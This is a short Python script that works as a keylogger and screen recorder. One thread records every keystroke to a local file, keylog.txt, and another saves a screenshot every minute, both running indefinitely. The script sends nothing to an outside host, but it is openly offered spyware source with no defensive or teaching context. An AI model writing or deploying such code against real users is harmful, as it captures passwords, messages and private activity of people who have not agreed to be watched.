import os
import sys
import time
import threading
import pyautogui
import pynput.keyboard

def log_keystrokes():
    def on_press(key):
        try:
            with open("keylog.txt", "a") as f:
                f.write(str(key))
        except:
            pass

    listener = pynput.keyboard.Listener(on_press=on_press)
    listener.start()

    while True:
        time.sleep(0.1)

def screenshot():
    while True:
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")
        time.sleep(60)

if __name__ == "__main__":
    keylogger_thread = threading.Thread(target=log_keystrokes)
    screenshot_thread = threading.Thread(target=screenshot)

    keylogger_thread.start()
    screenshot_thread.start()

    keylogger_thread.join()
    screenshot_thread.join()
